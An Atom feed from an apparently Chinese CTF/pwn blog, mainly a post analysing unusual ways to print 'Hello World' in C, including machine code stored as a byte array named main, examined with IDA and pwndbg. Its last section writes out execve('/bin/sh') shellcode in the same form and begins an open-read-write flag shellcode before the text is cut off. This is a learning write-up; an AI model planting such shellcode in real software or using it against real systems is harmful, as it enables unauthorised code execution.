<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-05-11T13:36:10.997Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-05-11T13:36:10.997Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19MBY8lMtinW07TtqXLVlJoUfbD7ZJSUbM= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-08T04:11:22.268Z</updated>
    
    <content type="html"><![CDATA[<p> 前段时间在逛知乎的时候，偶然发现一道有意思的编程题<br><img alt="知乎" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbqsq.png" class="lozad"><br>参考链接：<a href="https://www.zhihu.com/question/66088898/answer/238036040" target="_blank" rel="noopener">hello world编程题你会吗？</a><br> Helllo World算是最简单也最基础的程序了，我们一般在编写c语言代码的时候，输入输出都会很自然地联想到frintf()和scanf()，这几道题非常地有意思，要求跳出常规思维输出’’Hello World’。</p><h2 id="1-不用-“-“-输出Hello-World！"><a href="#1-不用-“-“-输出Hello-World！" class="headerlink" title="1.不用 “ “ 输出Hello,World！"></a>1.不用 “ “ 输出Hello,World！</h2><p> 不用” “输出，那么就不能用scanf()这个函数了，那么怎么办呢，想到c语言在处理字符常量的时候是把它当做数字来处理的，所以可以用普通char()函数把”Hello World”的每个字符的Ascii码输出。<br> 这道题如果引伸为不用引号来输出(单引号和双引号都不能使用),其实也是一样的，putchar()函数可以直接用数字作为参数。</p><h2 id="2-不用-输出Hello，World！"><a href="#2-不用-输出Hello，World！" class="headerlink" title="2.不用 ; 输出Hello，World！"></a>2.不用 ; 输出Hello，World！</h2><p> 不用;输出，也就是出代码中不能出现完整的语句，仔细思考下在c语言当中哪些位置可以不用;的，发现if语句刚好满足要求。</p><p>附上同时满足条件1和2的程序代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">87</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里需要说明的一点是，在最新的c标准中，已经不允许main函数的类型为void。</p><h2 id="3-不用-输出Hello-World！"><a href="#3-不用-输出Hello-World！" class="headerlink" title="3.不用# 输出Hello,World！"></a>3.不用# 输出Hello,World！</h2><p> 这道题不得不感叹自己所学的知识的贫瘠，一直想着怎么在windows编译环境下怎么达到这个条件，看了原帖的回复，说是要重新定义printf()函数，然后在dev里试了试重新定义了一下printf函数，发现报错没有定义printf()这个函数。<br> 后来才发现原来重新定义printf()函数在linux环境下是可以实现要求的。</p><p><img alt="img" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/dl53pg26qconiqrkjv1b43o1g7.png" class="lozad"></p><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format,...)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello, world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用"><a href="#4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用" class="headerlink" title="4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )"></a>4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</h2><p> 第四题出题人并不是为了输出”Hello World”出的题，本意在了解ELF文件格式。<br>附上知乎大佬的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main = <span class="number">0x55</span>, main1 = <span class="number">0x48</span>, main2 = <span class="number">0x89</span>, main3 = <span class="number">0xe5</span>, main4 = <span class="number">0xb8</span>,</span><br><span class="line">           main5 = <span class="number">0x01</span>, main6 = <span class="number">0x00</span>, main7 = <span class="number">0x00</span>, main8 = <span class="number">0x00</span>, main9 = <span class="number">0xbb</span>,</span><br><span class="line">           main10 = <span class="number">0x01</span>, main11 = <span class="number">0x00</span>, main12 = <span class="number">0x00</span>, main13 = <span class="number">0x00</span>,</span><br><span class="line">           main14 = <span class="number">0x67</span>, main15 = <span class="number">0x8d</span>, main16 = <span class="number">0x35</span>, main17 = <span class="number">0x10</span>,</span><br><span class="line">           main18 = <span class="number">0x00</span>, main19 = <span class="number">0x00</span>, main20 = <span class="number">0x00</span>, main21 = <span class="number">0xba</span>,</span><br><span class="line">           main22 = <span class="number">0x0d</span>, main23 = <span class="number">0x00</span>, main24 = <span class="number">0x00</span>, main25 = <span class="number">0x00</span>,</span><br><span class="line">           main26 = <span class="number">0x0f</span>, main27 = <span class="number">0x05</span>, main28 = <span class="number">0xb8</span>, main29 = <span class="number">0x3c</span>,</span><br><span class="line">           main30 = <span class="number">0x00</span>, main31 = <span class="number">0x00</span>, main32 = <span class="number">0x00</span>, main33 = <span class="number">0x31</span>,</span><br><span class="line">           main34 = <span class="number">0xdb</span>, main35 = <span class="number">0x0f</span>, main36 = <span class="number">0x05</span>, main37 = <span class="number">0x48</span>,</span><br><span class="line">           main38 = <span class="number">0x65</span>, main39 = <span class="number">0x6c</span>, main40 = <span class="number">0x6c</span>, main41 = <span class="number">0x6f</span>,</span><br><span class="line">           main42 = <span class="number">0x20</span>, main43 = <span class="number">0x57</span>, main44 = <span class="number">0x6f</span>, main45 = <span class="number">0x72</span>,</span><br><span class="line">           main46 = <span class="number">0x6c</span>, main47 = <span class="number">0x64</span>, main48 = <span class="number">0x21</span>, main49 = <span class="number">0x0a</span>,</span><br><span class="line">           main50 = <span class="number">0x5d</span>;</span><br></pre></td></tr></table></figure><h2 id="5-对上述代码的分析"><a href="#5-对上述代码的分析" class="headerlink" title="5.对上述代码的分析"></a>5.对上述代码的分析</h2><p>其中最让我不能理解的是第四种方式输出的Hello ,World!</p><p>我用gcc编译器，把他编译后运行，的确能输出Hello ,World!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜   gcc test.c -o <span class="built_in">test</span></span><br><span class="line">➜   ./<span class="built_in">test</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><p>用ida反编译一下，可以看到start函数还是很正常的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004003E0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004003E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004003E0                 xor     ebp, ebp</span><br><span class="line">.text:00000000004003E2                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000004003E5                 pop     rsi             ; argc</span><br><span class="line">.text:00000000004003E6                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000004003E9                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004003ED                 push    rax</span><br><span class="line">.text:00000000004003EE                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004003EF                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004003F6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004003FD                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400404                 call    ___libc_start_main</span><br><span class="line">.text:0000000000400409                 hlt</span><br><span class="line">.text:0000000000400409 ; &#125; // starts at 4003E0</span><br><span class="line">.text:0000000000400409 _start          endp</span><br><span class="line">.text:0000000000400409</span><br></pre></td></tr></table></figure><p>继续看main函数,就变得很不正常了，而且他是在data段。？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400564 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.rodata:0000000000400564 main            db  55h ; U             ; DATA XREF: _start+1D↑o</span><br><span class="line">.rodata:0000000000400565                 public main1</span><br><span class="line">.rodata:0000000000400565 main1           db  48h ; H</span><br><span class="line">.rodata:0000000000400566                 public main2</span><br><span class="line">.rodata:0000000000400566 main2           db  89h</span><br><span class="line">.rodata:0000000000400567                 public main3</span><br><span class="line">.rodata:0000000000400567 main3           db 0E5h</span><br><span class="line">.rodata:0000000000400568                 public main4</span><br><span class="line">.rodata:0000000000400568 main4           db 0B8h</span><br><span class="line">.rodata:0000000000400569                 public main5</span><br><span class="line">.rodata:0000000000400569 main5           db    1</span><br><span class="line">.rodata:000000000040056A                 public main6</span><br><span class="line">.rodata:000000000040056A main6           db    0</span><br><span class="line">.rodata:000000000040056B                 public main7</span><br><span class="line">.rodata:000000000040056B main7           db    0</span><br><span class="line">.rodata:000000000040056C                 public main8</span><br><span class="line">.rodata:000000000040056C main8           db    0</span><br><span class="line">.rodata:000000000040056D                 public main9</span><br><span class="line">.rodata:000000000040056D main9           db 0BBh</span><br><span class="line">.rodata:000000000040056E                 public main10</span><br><span class="line">.rodata:000000000040056E main10          db    1</span><br><span class="line">.rodata:000000000040056F                 public main11</span><br><span class="line">.rodata:000000000040056F main11          db    0</span><br><span class="line">.rodata:0000000000400570                 public main12</span><br><span class="line">.rodata:0000000000400570 main12          db    0</span><br><span class="line">.rodata:0000000000400571                 public main13</span><br><span class="line">.rodata:0000000000400571 main13          db    0</span><br><span class="line">.rodata:0000000000400572                 public main14</span><br><span class="line">.rodata:0000000000400572 main14          db  67h ; g</span><br><span class="line">.rodata:0000000000400573                 public main15</span><br><span class="line">.rodata:0000000000400573 main15          db  8Dh</span><br><span class="line">.rodata:0000000000400574                 public main16</span><br><span class="line">.rodata:0000000000400574 main16          db  35h ; 5</span><br><span class="line">.rodata:0000000000400575                 public main17</span><br><span class="line">.rodata:0000000000400575 main17          db  10h</span><br><span class="line">.rodata:0000000000400576                 public main18</span><br><span class="line">.rodata:0000000000400576 main18          db    0</span><br><span class="line">.rodata:0000000000400577                 public main19</span><br><span class="line">.rodata:0000000000400577 main19          db    0</span><br><span class="line">.rodata:0000000000400578                 public main20</span><br><span class="line">.rodata:0000000000400578 main20          db    0</span><br><span class="line">.rodata:0000000000400579                 public main21</span><br><span class="line">.rodata:0000000000400579 main21          db 0BAh</span><br><span class="line">.rodata:000000000040057A                 public main22</span><br><span class="line">.rodata:000000000040057A main22          db  0Dh</span><br><span class="line">.rodata:000000000040057B                 public main23</span><br><span class="line">.rodata:000000000040057B main23          db    0</span><br><span class="line">.rodata:000000000040057C                 public main24</span><br><span class="line">.rodata:000000000040057C main24          db    0</span><br><span class="line">.rodata:000000000040057D                 public main25</span><br><span class="line">.rodata:000000000040057D main25          db    0</span><br><span class="line">.rodata:000000000040057E                 public main26</span><br><span class="line">.rodata:000000000040057E main26          db  0Fh</span><br><span class="line">.rodata:000000000040057F                 public main27</span><br><span class="line">.rodata:000000000040057F main27          db    5</span><br><span class="line">.rodata:0000000000400580                 public main28</span><br><span class="line">.rodata:0000000000400580 main28          db 0B8h</span><br><span class="line">.rodata:0000000000400581                 public main29</span><br><span class="line">.rodata:0000000000400581 main29          db  3Ch ; &lt;</span><br><span class="line">.rodata:0000000000400582                 public main30</span><br><span class="line">.rodata:0000000000400582 main30          db    0</span><br><span class="line">.rodata:0000000000400583                 public main31</span><br><span class="line">.rodata:0000000000400583 main31          db    0</span><br><span class="line">.rodata:0000000000400584                 public main32</span><br><span class="line">.rodata:0000000000400584 main32          db    0</span><br><span class="line">.rodata:0000000000400585                 public main33</span><br><span class="line">.rodata:0000000000400585 main33          db  31h ; 1</span><br><span class="line">.rodata:0000000000400586                 public main34</span><br><span class="line">.rodata:0000000000400586 main34          db 0DBh</span><br><span class="line">.rodata:0000000000400587                 public main35</span><br><span class="line">.rodata:0000000000400587 main35          db  0Fh</span><br><span class="line">.rodata:0000000000400588                 public main36</span><br><span class="line">.rodata:0000000000400588 main36          db    5</span><br><span class="line">.rodata:0000000000400589                 public main37</span><br><span class="line">.rodata:0000000000400589 main37          db  48h ; H</span><br><span class="line">.rodata:000000000040058A                 public main38</span><br><span class="line">.rodata:000000000040058A main38          db  65h ; e</span><br><span class="line">.rodata:000000000040058B                 public main39</span><br><span class="line">.rodata:000000000040058B main39          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058C                 public main40</span><br><span class="line">.rodata:000000000040058C main40          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058D                 public main41</span><br><span class="line">.rodata:000000000040058D main41          db  6Fh ; o</span><br><span class="line">.rodata:000000000040058E                 public main42</span><br><span class="line">.rodata:000000000040058E main42          db  20h</span><br><span class="line">.rodata:000000000040058F                 public main43</span><br><span class="line">.rodata:000000000040058F main43          db  57h ; W</span><br><span class="line">.rodata:0000000000400590                 public main44</span><br><span class="line">.rodata:0000000000400590 main44          db  6Fh ; o</span><br><span class="line">.rodata:0000000000400591                 public main45</span><br><span class="line">.rodata:0000000000400591 main45          db  72h ; r</span><br><span class="line">.rodata:0000000000400592                 public main46</span><br><span class="line">.rodata:0000000000400592 main46          db  6Ch ; l</span><br><span class="line">.rodata:0000000000400593                 public main47</span><br><span class="line">.rodata:0000000000400593 main47          db  64h ; d</span><br><span class="line">.rodata:0000000000400594                 public main48</span><br><span class="line">.rodata:0000000000400594 main48          db  21h ; !</span><br><span class="line">.rodata:0000000000400595                 public main49</span><br><span class="line">.rodata:0000000000400595 main49          db  0Ah</span><br><span class="line">.rodata:0000000000400596                 public main50</span><br><span class="line">.rodata:0000000000400596 main50          db  5Dh ; ]</span><br><span class="line">.rodata:0000000000400596 _rodata         ends</span><br></pre></td></tr></table></figure><p>接下来我用gdb动态调试一波,下断点到main函数的地方,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400564</span><br><span class="line">Breakpoint 2 at 0x400564</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400564 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x400564 (main) ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7fffffffde28 —▸ 0x7fffffffe1df ◂— &apos;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&apos;</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line"> R8   0x400550 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x846</span><br><span class="line"> R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde10 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4004e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400564 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line"> ► 0x400564 &lt;main&gt;      push   rbp &lt;0x4004e0&gt;</span><br><span class="line">   0x400565 &lt;main1&gt;     mov    rbp, rsp</span><br><span class="line">   0x400568 &lt;main4&gt;     mov    eax, 1</span><br><span class="line">   0x40056d &lt;main9&gt;     mov    ebx, 1</span><br><span class="line">   0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</span><br><span class="line">   0x400579 &lt;main21&gt;    mov    edx, 0xd</span><br><span class="line">   0x40057e &lt;main26&gt;    syscall </span><br><span class="line">   0x400580 &lt;main28&gt;    mov    eax, 0x3c</span><br><span class="line">   0x400585 &lt;main33&gt;    xor    ebx, ebx</span><br><span class="line">   0x400587 &lt;main35&gt;    syscall </span><br><span class="line">   0x400589 &lt;main37&gt;    insb   byte ptr [rdi], dx</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fffffffdd40 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffdd48 —▸ 0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line">03:0018│      0x7fffffffdd50 ◂— 0x1f7ffcca0</span><br><span class="line">04:0020│      0x7fffffffdd58 —▸ 0x400564 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fffffffdd60 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd68 ◂— 0x74c583ff1005bf92</span><br><span class="line">07:0038│      0x7fffffffdd70 —▸ 0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           400564 main</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint *0x400564</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>看到这里我明白了，上述代码其实是一段shellcode，gcc编译器是如何识别并编译的，这里我不得而知，看来还要再看一遍程序员的自我修养啊。</p><p>分析一下生成的汇编吧。<code>0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</code> 其中这段汇编让我很感兴趣，第一次见到用eip作为基址然后调整偏移来传参的,很显然里面存的是Hello world，然后syscall系统调用write函数输出，第二次syscall系统调用exit函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10s 0x400579+0x10</span><br><span class="line">0x400589 &lt;main37&gt;:&quot;Hello World!\n]&quot;</span><br><span class="line">0x400598:&quot;\001\033\003;,&quot;</span><br><span class="line">0x40059e:&quot;&quot;</span><br><span class="line">0x40059f:&quot;&quot;</span><br><span class="line">0x4005a0:&quot;\004&quot;</span><br><span class="line">0x4005a2:&quot;&quot;</span><br><span class="line">0x4005a3:&quot;&quot;</span><br><span class="line">0x4005a4:&quot;\030\376\377\377x&quot;</span><br><span class="line">0x4005aa:&quot;&quot;</span><br><span class="line">0x4005ab:&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-模仿操作"><a href="#6-模仿操作" class="headerlink" title="6.模仿操作"></a>6.模仿操作</h2><p>用上述方式写 execve(“/bin/sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>  main = <span class="number">0x6a</span>, main1 = <span class="number">0x42</span>, main2 = <span class="number">0x58</span>, main3 = <span class="number">0xfe</span>, main4 = <span class="number">0xc4</span>, main5 = <span class="number">0x48</span>, main6 = <span class="number">0x99</span>, main7 = <span class="number">0x52</span>, main8 = <span class="number">0x48</span>, main9 = <span class="number">0xbf</span>,main10 = <span class="number">0x2f</span>, main11 = <span class="number">0x62</span>, main12 = <span class="number">0x69</span>, main13 = <span class="number">0x6e</span>, main14 = <span class="number">0x2f</span>, main15 = <span class="number">0x2f</span>, main16 = <span class="number">0x73</span>, main17 = <span class="number">0x68</span>, main18 = <span class="number">0x57</span>, main19 = <span class="number">0x54</span>,main20 = <span class="number">0x5e</span>, main21 = <span class="number">0x49</span>, main22 = <span class="number">0x89</span>, main23 = <span class="number">0xd0</span>, main24 = <span class="number">0x49</span>, main25 = <span class="number">0x89</span>, main26 = <span class="number">0xd2</span>, main27 = <span class="number">0x0f</span>, main28 = <span class="number">0x05</span>;</span><br></pre></td></tr></table></figure><p>orw flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x48</span>,main1=<span class="number">0xb8</span>,main2=<span class="number">0x1</span>,main3=<span class="number">0x1</span>,main4=<span class="number">0x1</span>,main5=<span class="number">0x1</span>,main6=<span class="number">0x1</span>,main7=<span class="number">0x1</span>,main8=<span class="number">0x1</span>,main9=<span class="number">0x1</span>,main10=<span 